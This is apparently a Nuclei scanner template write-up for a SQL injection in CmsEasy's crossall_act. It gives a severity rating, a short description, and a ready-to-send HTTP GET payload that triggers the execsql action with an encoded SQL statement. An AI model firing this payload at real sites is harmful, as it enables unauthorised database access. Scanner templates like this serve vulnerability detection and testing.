# Nuclei Template: CmsEasy crossall_act - SQL Injection
**Template ID:** cmseasy-crossall-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**Source:** Nuclei Template (`cmseasy-crossall-act-sqli.yaml`)

## Vulnerability Information & PoC

## Description
CmsEasy crossall_act.php SQL Injection Vulnerability. CmsEasy has a SQL injection vulnerability. Any SQL command can be executed by encrypting the SQL statement in the file service.php.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/?case=crossall&act=execsql&sql=WY8gzSfZwW9R5YvyK
```

## References
- https://cn-sec.com/archives/1580677.html
- https://github.com/GREENHAT7/pxplan/blob/e2fc04893ca95e177021ddf61cc2134ecc120a8e/goby_pocs/CmsEasy_crossall_act.php_SQL_injection_vulnerability.json#L28
